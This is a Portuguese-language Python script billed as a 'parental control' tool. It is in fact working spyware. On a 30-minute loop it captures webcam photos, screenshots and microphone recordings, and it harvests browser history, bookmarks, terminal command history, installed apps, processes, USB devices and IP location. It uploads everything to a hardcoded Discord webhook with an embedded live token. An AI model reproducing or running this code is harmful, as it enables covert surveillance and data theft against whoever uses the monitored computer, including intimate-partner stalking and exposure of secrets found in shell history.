#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CONTROLE PARENTAL - UNIVERSAL (Windows + Linux)
Auto-instala dependências e funciona em ambos os sistemas.
"""

# ==================== AUTO-INSTALAÇÃO ====================
import subprocess
import sys
import os

def instalar_dependencias():
    """Instala dependências automaticamente."""
    
    dependencias = {
        "pillow": "PIL",
        "opencv-python": "cv2",
        "psutil": "psutil",
        "sounddevice": "sounddevice",
        "scipy": "scipy",
        "numpy": "numpy"
    }
    
    print("\n[*] A verificar dependências...\n")
    
    for pacote, modulo in dependencias.items():
        try:
            __import__(modulo)
            print(f"    [OK] {pacote}")
        except ImportError:
            print(f"    [!!] A instalar {pacote}...")
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pacote, "-q", "--disable-pip-version-check"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"    [OK] {pacote} instalado!")
            except Exception as e:
                print(f"    [ERRO] Falha ao instalar {pacote}: {e}")
    
    print("\n[+] Dependências verificadas!\n")

# Instala antes de tudo
instalar_dependencias()

# ==================== IMPORTS ====================
import time
import json
import sqlite3
import platform
import shutil
import threading
from datetime import datetime
from urllib.request import Request, urlopen
from pathlib import Path

# Imports com dependências
from PIL import ImageGrab, Image
import cv2
import psutil
import sounddevice as sd
import scipy.io.wavfile as wav
import numpy as np

# Windows específico
if platform.system() == "Windows":
    import winreg
    from PIL import ImageGrab
else:
    # Linux - usa alternativa para screenshot
    pass

# ==================== CONFIGURAÇÕES ====================
SISTEMA = platform.system()
HOME = str(Path.home())

LOG_DIR = os.path.join(HOME, "controle_parental", "logs")
REPORT_DIR = os.path.join(HOME, "controle_parental", "relatorios")
AUDIO_DIR = os.path.join(HOME, "controle_parental", "audios")

MAX_LOG_AGE_DAYS = 7
INTERVALO_MINUTOS = 30
TEMPO_INICIO = time.time()

# ⚠️ SUBSTITUI PELO TEU WEBHOOK
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"

# ==================== SETUP ====================
def setup():
    """Cria pastas necessárias."""
    for pasta in [LOG_DIR, REPORT_DIR, AUDIO_DIR]:
        os.makedirs(pasta, exist_ok=True)
    print(f"[+] Sistema: {SISTEMA}")
    print(f"[+] Pastas criadas em: {os.path.dirname(LOG_DIR)}")

# ==================== UTILITÁRIOS ====================
def caminho(*partes):
    """Cria caminho compatível com o sistema."""
    return os.path.join(*partes)

def expandir_caminho(path):
    """Expande ~ para home do usuário."""
    return os.path.expanduser(path)

def executar_comando(comando, shell=False):
    """Executa comando e retorna output."""
    try:
        if isinstance(comando, str):
            comando = comando.split()
        result = subprocess.run(
            comando,
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            shell=shell,
            timeout=30
        )
        return result.stdout.strip()
    except Exception as e:
        return ""

def timestamp():
    """Retorna timestamp atual formatado."""
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

# ==================== DISCORD ====================
def enviar_discord_texto(titulo: str, descricao: str):
    """Envia mensagem de texto para Discord."""
    try:
        embed = {
            "embeds": [{
                "title": titulo,
                "description": descricao[:4000],
                "color": 3447003,
                "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                "footer": {"text": f"Controle Parental | {SISTEMA}"}
            }]
        }
        
        dados = json.dumps(embed).encode('utf-8')
        req = Request(DISCORD_WEBHOOK_URL, data=dados)
        req.add_header('Content-Type', 'application/json')
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        response = urlopen(req, timeout=30)
        if response.status == 204:
            print("[+] Mensagem enviada ao Discord!")
            return True
        return False
    except Exception as e:
        print(f"[-] Erro Discord: {e}")
        return False

def enviar_discord_arquivo(arquivo: str, mensagem: str = ""):
    """Envia arquivo para Discord."""
    try:
        if not os.path.exists(arquivo):
            print(f"[-] Arquivo não existe: {arquivo}")
            return False
        
        boundary = f"----Boundary{int(time.time())}"
        
        with open(arquivo, "rb") as f:
            conteudo = f.read()
        
        nome = os.path.basename(arquivo)
        ext = nome.split('.')[-1].lower()
        
        tipos = {
            'png': 'image/png',
            'jpg': 'image/jpeg',
            'jpeg': 'image/jpeg',
            'wav': 'audio/wav',
            'txt': 'text/plain; charset=utf-8'
        }
        content_type = tipos.get(ext, 'application/octet-stream')
        
        body = b''
        if mensagem:
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="content"\r\n\r\n'
            body += mensagem.encode('utf-8') + b'\r\n'
        
        body += f'--{boundary}\r\n'.encode()
        body += f'Content-Disposition: form-data; name="file"; filename="{nome}"\r\n'.encode()
        body += f'Content-Type: {content_type}\r\n\r\n'.encode()
        body += conteudo + b'\r\n'
        body += f'--{boundary}--\r\n'.encode()
        
        req = Request(DISCORD_WEBHOOK_URL, data=body)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        response = urlopen(req, timeout=120)
        if response.status == 200:
            print(f"[+] Enviado: {nome}")
            return True
        return False
    except Exception as e:
        print(f"[-] Erro envio: {e}")
        return False

# ==================== SALVAR TXT ====================
def salvar_txt(nome: str, dados: dict):
    """Salva dados em arquivo .txt"""
    try:
        ts = timestamp()
        arquivo = caminho(REPORT_DIR, f"{nome}_{ts}.txt")
        
        with open(arquivo, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write(f"  {nome.upper()} - {ts}\n")
            f.write(f"  Sistema: {SISTEMA}\n")
            f.write("=" * 60 + "\n\n")
            
            for chave, valor in dados.items():
                f.write(f">> {chave.upper()}\n")
                f.write("-" * 40 + "\n")
                
                if isinstance(valor, list):
                    for i, item in enumerate(valor, 1):
                        f.write(f"  {i}. {item}\n")
                elif isinstance(valor, dict):
                    for k, v in valor.items():
                        f.write(f"  * {k}: {v}\n")
                else:
                    f.write(f"  {valor}\n")
                f.write("\n")
        
        print(f"[+] Salvo: {nome}_{ts}.txt")
        return arquivo
    except Exception as e:
        print(f"[-] Erro salvar: {e}")
        return None

# ==================== 1. TEMPO DE USO ====================
def obter_tempo_uso():
    """Obtém tempo de uso do PC."""
    try:
        # Tempo da sessão do script
        tempo = time.time() - TEMPO_INICIO
        h = int(tempo // 3600)
        m = int((tempo % 3600) // 60)
        s = int(tempo % 60)
        
        # Tempo desde o boot
        boot = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot
        
        return {
            "sessao_script": f"{h}h {m}m {s}s",
            "desde_boot": str(uptime).split('.')[0],
            "hora_boot": boot.strftime("%Y-%m-%d %H:%M:%S")
        }
    except Exception as e:
        return {"erro": str(e)}

# ==================== 2. CAPTURA DE ÁUDIO ====================
def capturar_audio(duracao=10):
    """Grava áudio do microfone."""
    try:
        ts = timestamp()
        arquivo = caminho(AUDIO_DIR, f"audio_{ts}.wav")
        
        print(f"[*] A gravar áudio ({duracao}s)...")
        
        # Configuração
        sample_rate = 44100
        channels = 1
        
        # Grava
        audio = sd.rec(
            int(duracao * sample_rate),
            samplerate=sample_rate,
            channels=channels,
            dtype='int16'
        )
        sd.wait()
        
        # Salva
        wav.write(arquivo, sample_rate, audio)
        
        print(f"[+] Áudio: {os.path.basename(arquivo)}")
        return arquivo
    except Exception as e:
        print(f"[-] Erro áudio: {e}")
        return None

# ==================== 5. DISPOSITIVOS USB ====================
def listar_usb():
    """Lista dispositivos USB conectados."""
    try:
        dispositivos = []
        
        if SISTEMA == "Windows":
            # Método 1: PowerShell
            cmd = 'Get-PnpDevice -Class USB | Select-Object -ExpandProperty FriendlyName'
            output = executar_comando(["powershell", "-Command", cmd])
            if output:
                dispositivos = [l.strip() for l in output.split('\n') if l.strip()]
            
            # Método 2: WMIC (fallback)
            if not dispositivos:
                output = executar_comando(["wmic", "path", "Win32_USBControllerDevice", "get", "Dependent"])
                if output:
                    dispositivos = [l.strip() for l in output.split('\n') if l.strip() and "Dependent" not in l]
        
        else:  # Linux
            output = executar_comando(["lsusb"])
            if output:
                dispositivos = output.split('\n')
        
        dispositivos = [d for d in dispositivos if d][:30]
        print(f"[+] USB: {len(dispositivos)} dispositivos")
        return dispositivos
    except Exception as e:
        print(f"[-] Erro USB: {e}")
        return []

# ==================== 6. LOCALIZAÇÃO ====================
def obter_localizacao():
    """Obtém localização via IP."""
    try:
        req = Request("http://ip-api.com/json/")
        req.add_header('User-Agent', 'Mozilla/5.0')
        response = urlopen(req, timeout=10)
        dados = json.loads(response.read().decode())
        
        if dados.get("status") == "success":
            loc = {
                "ip": dados.get("query", "?"),
                "cidade": dados.get("city", "?"),
                "regiao": dados.get("regionName", "?"),
                "pais": dados.get("country", "?"),
                "isp": dados.get("isp", "?"),
                "latitude": dados.get("lat", "?"),
                "longitude": dados.get("lon", "?")
            }
            print(f"[+] Local: {loc['cidade']}, {loc['pais']}")
            return loc
        return {"erro": "Falha na API"}
    except Exception as e:
        print(f"[-] Erro localização: {e}")
        return {"erro": str(e)}

# ==================== 9. PROCESSOS ====================
def listar_processos():
    """Lista processos em execução."""
    try:
        processos = []
        
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                info = proc.info
                mem = info.get('memory_percent', 0) or 0
                cpu = info.get('cpu_percent', 0) or 0
                
                if mem > 0.1 or cpu > 0:
                    processos.append({
                        'nome': info['name'],
                        'pid': info['pid'],
                        'cpu': cpu,
                        'mem': mem
                    })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # Ordena por memória
        processos.sort(key=lambda x: x['mem'], reverse=True)
        
        # Formata
        resultado = [
            f"{p['nome']} (PID:{p['pid']}) CPU:{p['cpu']:.1f}% RAM:{p['mem']:.1f}%"
            for p in processos[:50]
        ]
        
        print(f"[+] Processos: {len(resultado)}")
        return resultado
    except Exception as e:
        print(f"[-] Erro processos: {e}")
        return []

# ==================== 10. HISTÓRICO TERMINAL ====================
def obter_historico_terminal():
    """Obtém histórico de comandos do terminal."""
    try:
        comandos = []
        
        if SISTEMA == "Windows":
            # PowerShell history
            paths = [
                caminho(HOME, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt"),
            ]
        else:
            # Linux: bash, zsh, fish
            paths = [
                caminho(HOME, ".bash_history"),
                caminho(HOME, ".zsh_history"),
                caminho(HOME, ".local", "share", "fish", "fish_history"),
            ]
        
        for path in paths:
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        linhas = f.readlines()[-100:]  # Últimos 100
                        for linha in linhas:
                            cmd = linha.strip()
                            # Limpa formatação do zsh/fish
                            if cmd.startswith(":"):
                                cmd = cmd.split(";", 1)[-1] if ";" in cmd else cmd
                            if cmd and not cmd.startswith("#"):
                                comandos.append(cmd)
                except:
                    pass
        
        print(f"[+] Comandos terminal: {len(comandos)}")
        return comandos[-100:]  # Últimos 100
    except Exception as e:
        print(f"[-] Erro terminal: {e}")
        return []

# ==================== 12. INFO DO SISTEMA ====================
def obter_info_sistema():
    """Obtém informações do sistema."""
    try:
        # Básico
        info = {
            "sistema": SISTEMA,
            "versao": platform.release(),
            "arquitetura": platform.machine(),
            "hostname": platform.node(),
            "processador": platform.processor() or "N/A"
        }
        
        # Usuário
        try:
            info["usuario"] = os.getlogin()
        except:
            info["usuario"] = os.environ.get("USER", os.environ.get("USERNAME", "?"))
        
        # CPU
        info["cpu_nucleos"] = psutil.cpu_count()
        info["cpu_uso"] = f"{psutil.cpu_percent(interval=1)}%"
        
        # RAM
        mem = psutil.virtual_memory()
        info["ram_total"] = f"{mem.total / (1024**3):.1f} GB"
        info["ram_uso"] = f"{mem.percent}%"
        info["ram_disponivel"] = f"{mem.available / (1024**3):.1f} GB"
        
        # Disco
        disco = psutil.disk_usage('/')
        info["disco_total"] = f"{disco.total / (1024**3):.1f} GB"
        info["disco_uso"] = f"{disco.percent}%"
        info["disco_livre"] = f"{disco.free / (1024**3):.1f} GB"
        
        # Bateria
        bat = psutil.sensors_battery()
        if bat:
            info["bateria"] = f"{bat.percent}%"
            info["a_carregar"] = "Sim" if bat.power_plugged else "Não"
            if bat.secsleft > 0:
                mins = bat.secsleft // 60
                info["tempo_restante"] = f"{mins} min"
        else:
            info["bateria"] = "N/A (Desktop)"
        
        print("[+] Info sistema obtida")
        return info
    except Exception as e:
        print(f"[-] Erro sistema: {e}")
        return {"erro": str(e)}

# ==================== 15. FAVORITOS ====================
def obter_favoritos():
    """Obtém favoritos do navegador."""
    try:
        favoritos = []
        
        # Caminhos do Chrome
        if SISTEMA == "Windows":
            chrome_paths = [
                caminho(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Bookmarks"),
                caminho(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "Bookmarks"),
            ]
            edge_path = caminho(HOME, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Bookmarks")
            chrome_paths.append(edge_path)
        else:
            chrome_paths = [
                caminho(HOME, ".config", "google-chrome", "Default", "Bookmarks"),
                caminho(HOME, ".config", "chromium", "Default", "Bookmarks"),
                caminho(HOME, "snap", "chromium", "common", "chromium", "Default", "Bookmarks"),
            ]
        
        def extrair_bookmarks(node):
            """Extrai bookmarks recursivamente."""
            resultado = []
            if isinstance(node, dict):
                if node.get("type") == "url":
                    nome = node.get("name", "?")[:40]
                    url = node.get("url", "")[:60]
                    resultado.append(f"{nome} - {url}")
                for child in node.get("children", []):
                    resultado.extend(extrair_bookmarks(child))
            return resultado
        
        for path in chrome_paths:
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        dados = json.load(f)
                        for key in dados.get("roots", {}):
                            favoritos.extend(extrair_bookmarks(dados["roots"][key]))
                except:
                    pass
        
        favoritos = list(set(favoritos))[:100]
        print(f"[+] Favoritos: {len(favoritos)}")
        return favoritos
    except Exception as e:
        print(f"[-] Erro favoritos: {e}")
        return []

# ==================== CAPTURAS ====================
def capturar_tela():
    """Captura screenshot."""
    try:
        ts = timestamp()
        arquivo = caminho(REPORT_DIR, f"tela_{ts}.png")
        
        if SISTEMA == "Windows":
            # Windows: PIL ImageGrab
            img = ImageGrab.grab()
            img.save(arquivo)
        else:
            # Linux: tenta várias ferramentas
            ferramentas = [
                ["gnome-screenshot", "-f", arquivo],
                ["scrot", arquivo],
                ["import", "-window", "root", arquivo],  # ImageMagick
                ["spectacle", "-b", "-f", "-o", arquivo],  # KDE
            ]
            
            sucesso = False
            for cmd in ferramentas:
                try:
                    result = subprocess.run(cmd, capture_output=True, timeout=5)
                    if os.path.exists(arquivo):
                        sucesso = True
                        break
                except:
                    continue
            
            if not sucesso:
                # Fallback: usa PIL se tiver display
                try:
                    import pyscreenshot as ImageGrab
                    img = ImageGrab.grab()
                    img.save(arquivo)
                except:
                    print("[-] Screenshot: instala 'scrot' ou 'gnome-screenshot'")
                    return None
        
        if os.path.exists(arquivo):
            print(f"[+] Screenshot: {os.path.basename(arquivo)}")
            return arquivo
        return None
    except Exception as e:
        print(f"[-] Erro screenshot: {e}")
        return None

def capturar_camera():
    """Captura foto da câmera."""
    try:
        ts = timestamp()
        arquivo = caminho(REPORT_DIR, f"camera_{ts}.jpg")
        
        print("[*] A abrir câmera...")
        
        # Tenta diferentes índices de câmera
        for i in range(3):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                break
            cap.release()
        
        if not cap.isOpened():
            print("[-] Câmera não disponível")
            return None
        
        # Aguarda estabilizar
        time.sleep(2)
        
        # Captura vários frames e usa o último (melhor qualidade)
        for _ in range(5):
            ret, frame = cap.read()
        
        cap.release()
        
        if ret and frame is not None:
            cv2.imwrite(arquivo, frame)
            print(f"[+] Câmera: {os.path.basename(arquivo)}")
            return arquivo
        
        print("[-] Falha ao capturar da câmera")
        return None
    except Exception as e:
        print(f"[-] Erro câmera: {e}")
        return None

# ==================== HISTÓRICO NAVEGADOR ====================
def obter_historico_navegador():
    """Obtém histórico do navegador."""
    try:
        historico = []
        
        # Caminhos do Chrome/Chromium
        if SISTEMA == "Windows":
            db_paths = [
                caminho(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History"),
                caminho(HOME, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History"),
                caminho(HOME, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "History"),
            ]
        else:
            db_paths = [
                caminho(HOME, ".config", "google-chrome", "Default", "History"),
                caminho(HOME, ".config", "chromium", "Default", "History"),
                caminho(HOME, ".config", "BraveSoftware", "Brave-Browser", "Default", "History"),
                caminho(HOME, "snap", "chromium", "common", "chromium", "Default", "History"),
            ]
        
        for db_path in db_paths:
            if os.path.exists(db_path):
                try:
                    # Copia para evitar lock
                    temp = caminho(REPORT_DIR, f"temp_hist_{int(time.time())}.db")
                    shutil.copy2(db_path, temp)
                    
                    conn = sqlite3.connect(temp)
                    cursor = conn.cursor()
                    cursor.execute("""
                        SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch')
                        FROM urls 
                        ORDER BY last_visit_time DESC 
                        LIMIT 100
                    """)
                    
                    for url, titulo, data in cursor.fetchall():
                        titulo_limpo = (titulo or "Sem título")[:35]
                        url_limpo = url[:55]
                        historico.append(f"[{data}] {titulo_limpo} - {url_limpo}")
                    
                    conn.close()
                    os.remove(temp)
                except Exception as e:
                    pass
        
        historico = historico[:100]
        print(f"[+] Histórico navegador: {len(historico)}")
        return historico
    except Exception as e:
        print(f"[-] Erro histórico: {e}")
        return []

# ==================== APPS INSTALADAS ====================
def obter_apps():
    """Lista aplicações instaladas."""
    try:
        apps = []
        
        if SISTEMA == "Windows":
            # Método 1: Registry
            paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
            ]
            
            for path in paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            try:
                                nome = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                if nome and len(nome) > 1:
                                    apps.append(nome)
                            except:
                                pass
                            winreg.CloseKey(subkey)
                        except:
                            pass
                    winreg.CloseKey(key)
                except:
                    pass
            
            # User apps
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        nome = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        if nome:
                            apps.append(nome)
                    except:
                        pass
            except:
                pass
        
        else:  # Linux
            # dpkg (Debian/Ubuntu)
            output = executar_comando(["dpkg", "--get-selections"])
            if output:
                for linha in output.split('\n'):
                    partes = linha.split()
                    if len(partes) >= 1:
                        apps.append(partes[0])
            
            # rpm (Fedora/RHEL)
            if not apps:
                output = executar_comando(["rpm", "-qa", "--qf", "%{NAME}\n"])
                if output:
                    apps = output.split('\n')
            
            # pacman (Arch)
            if not apps:
                output = executar_comando(["pacman", "-Q"])
                if output:
                    for linha in output.split('\n'):
                        partes = linha.split()
                        if partes:
                            apps.append(partes[0])
            
            # Flatpak
            output = executar_comando(["flatpak", "list", "--columns=application"])
            if output:
                apps.extend(output.split('\n'))
            
            # Snap
            output = executar_comando(["snap", "list"])
            if output:
                for linha in output.split('\n')[1:]:
                    partes = linha.split()
                    if partes:
                        apps.append(f"snap:{partes[0]}")
        
        # Remove duplicatas e limita
        apps = list(set([a for a in apps if a and len(a) > 1]))[:300]
        print(f"[+] Apps: {len(apps)}")
        return apps
    except Exception as e:
        print(f"[-] Erro apps: {e}")
        return []

# ==================== LIMPEZA ====================
def limpar_antigos():
    """Remove arquivos antigos."""
    try:
        limite = time.time() - (MAX_LOG_AGE_DAYS * 86400)
        removidos = 0
        
        for pasta in [LOG_DIR, REPORT_DIR, AUDIO_DIR]:
            if os.path.exists(pasta):
                for arq in os.listdir(pasta):
                    cam = caminho(pasta, arq)
                    try:
                        if os.path.getmtime(cam) < limite:
                            os.remove(cam)
                            removidos += 1
                    except:
                        pass
        
        if removidos:
            print(f"[+] Removidos {removidos} arquivos antigos")
    except:
        pass

# ==================== MONITORAMENTO PRINCIPAL ====================
def executar_monitoramento():
    """Executa ciclo completo de monitoramento."""
    
    print("\n" + "=" * 65)
    print(f"  MONITORAMENTO - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Sistema: {SISTEMA}")
    print("=" * 65 + "\n")
    
    # ===== COLETA DE DADOS =====
    print("[*] A recolher dados...\n")
    
    tempo_uso = obter_tempo_uso()
    localizacao = obter_localizacao()
    info_sistema = obter_info_sistema()
    dispositivos_usb = listar_usb()
    processos = listar_processos()
    historico_terminal = obter_historico_terminal()
    favoritos = obter_favoritos()
    historico_nav = obter_historico_navegador()
    apps = obter_apps()
    
    # ===== CAPTURAS =====
    print("\n[*] A fazer capturas...\n")
    
    foto_camera = capturar_camera()
    screenshot = capturar_tela()
    audio = capturar_audio(duracao=10)
    
    # ===== SALVAR RELATÓRIOS =====
    print("\n[*] A guardar relatórios...\n")
    
    arquivos_txt = []
    
    if historico_nav:
        a = salvar_txt("historico_navegador", {"sites_visitados": historico_nav})
        if a: arquivos_txt.append(a)
    
    if apps:
        a = salvar_txt("apps_instaladas", {"aplicacoes": apps})
        if a: arquivos_txt.append(a)
    
    if processos:
        a = salvar_txt("processos", {"em_execucao": processos})
        if a: arquivos_txt.append(a)
    
    if historico_terminal:
        a = salvar_txt("historico_terminal", {"comandos": historico_terminal})
        if a: arquivos_txt.append(a)
    
    if favoritos:
        a = salvar_txt("favoritos", {"bookmarks": favoritos})
        if a: arquivos_txt.append(a)
    
    if dispositivos_usb:
        a = salvar_txt("dispositivos_usb", {"conectados": dispositivos_usb})
        if a: arquivos_txt.append(a)
    
    # Relatório resumo
    resumo = {
        "tempo_uso": tempo_uso,
        "localizacao": localizacao,
        "sistema": info_sistema,
        "estatisticas": {
            "historico_navegador": f"{len(historico_nav)} sites",
            "apps_instaladas": f"{len(apps)} apps",
            "processos_ativos": f"{len(processos)} processos",
            "comandos_terminal": f"{len(historico_terminal)} comandos",
            "favoritos": f"{len(favoritos)} bookmarks",
            "dispositivos_usb": f"{len(dispositivos_usb)} dispositivos"
        }
    }
    a = salvar_txt("relatorio_completo", resumo)
    if a: arquivos_txt.append(a)
    
    # ===== ENVIAR PARA DISCORD =====
    print("\n[*] A enviar para Discord...\n")
    
    # Mensagem principal
    titulo = f"📊 Monitoramento - {datetime.now().strftime('%d/%m/%Y %H:%M')}"
    
    descricao = f"""
**⏱️ Tempo de Uso**
• Sessão: {tempo_uso.get('sessao_script', '?')}
• Desde boot: {tempo_uso.get('desde_boot', '?')}

**📍 Localização**
• {localizacao.get('cidade', '?')}, {localizacao.get('pais', '?')}
• IP: {localizacao.get('ip', '?')}
• ISP: {localizacao.get('isp', '?')}

**🖥️ Sistema**
• {info_sistema.get('sistema', '?')} {info_sistema.get('versao', '')}
• Utilizador: {info_sistema.get('usuario', '?')}
• CPU: {info_sistema.get('cpu_uso', '?')} ({info_sistema.get('cpu_nucleos', '?')} núcleos)
• RAM: {info_sistema.get('ram_uso', '?')} de {info_sistema.get('ram_total', '?')}
• Disco: {info_sistema.get('disco_uso', '?')} de {info_sistema.get('disco_total', '?')}
• Bateria: {info_sistema.get('bateria', 'N/A')}

**📈 Resumo**
• 🌐 Histórico: {len(historico_nav)} sites
• 📦 Apps: {len(apps)} instaladas
• 📊 Processos: {len(processos)} ativos
• 💻 Terminal: {len(historico_terminal)} comandos
• ⭐ Favoritos: {len(favoritos)} bookmarks
• 🔌 USB: {len(dispositivos_usb)} dispositivos
"""
    
    enviar_discord_texto(titulo, descricao)
    time.sleep(1)
    
    # Foto da câmera (PRIMEIRO - para ver quem está no PC)
    if foto_camera:
        enviar_discord_arquivo(foto_camera, "📸 **FOTO DA CÂMERA** - Quem está a usar o PC:")
        time.sleep(1)
    
    # Screenshot
    if screenshot:
        enviar_discord_arquivo(screenshot, "🖼️ **SCREENSHOT** - Ecrã atual:")
        time.sleep(1)
    
    # Áudio
    if audio:
        enviar_discord_arquivo(audio, "🎤 **ÁUDIO** - Gravação ambiente (10s):")
        time.sleep(1)
    
    # Ficheiros .txt
    for arq in arquivos_txt:
        enviar_discord_arquivo(arq)
        time.sleep(0.5)
    
    # Limpeza
    limpar_antigos()
    
    print("\n" + "=" * 65)
    print("  ✅ MONITORAMENTO CONCLUÍDO!")
    print("=" * 65 + "\n")

# ==================== MAIN ====================
def main():
    """Função principal."""
    
    banner = f"""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║            🛡️  CONTROLE PARENTAL - UNIVERSAL  🛡️                  ║
    ║                                                                   ║
    ╠═══════════════════════════════════════════════════════════════════╣
    ║                                                                   ║
    ║   Sistema Detectado: {SISTEMA:<44}║
    ║                                                                   ║
    ║   Funcionalidades:                                                ║
    ║   • Tempo de uso do PC          • Screenshot automático           ║
    ║   • Gravação de áudio           • Foto da câmera                  ║
    ║   • Dispositivos USB            • Histórico do navegador          ║
    ║   • Localização (IP)            • Apps instaladas                 ║
    ║   • Processos ativos            • Favoritos do browser            ║
    ║   • Histórico do terminal       • Relatórios em .txt              ║
    ║                                                                   ║
    ╠═══════════════════════════════════════════════════════════════════╣
    ║   ⚠️  As dependências são instaladas automaticamente!             ║
    ║   📁 Dados guardados em: ~/controle_parental/                     ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """
    
    print(banner)
    
    # Verifica webhook
    if "COLOCA_AQUI" in DISCORD_WEBHOOK_URL:
        print("\n" + "!" * 65)
        print("  ⚠️  ATENÇÃO: Configura o DISCORD_WEBHOOK_URL no código!")
        print("!" * 65 + "\n")
        input("Pressiona ENTER para continuar mesmo assim...")
    
    # Setup
    setup()
    
    # Primeira execução
    executar_monitoramento()
    
    # Loop
    print(f"\n[*] Próxima execução em {INTERVALO_MINUTOS} minutos...")
    print("[*] Pressiona Ctrl+C para parar\n")
    
    try:
        while True:
            time.sleep(INTERVALO_MINUTOS * 60)
            executar_monitoramento()
    except KeyboardInterrupt:
        print("\n\n[*] Parado pelo utilizador.")
        print("[*] Até à próxima!\n")

# ==================== EXECUÇÃO ====================
if __name__ == "__main__":
    main()
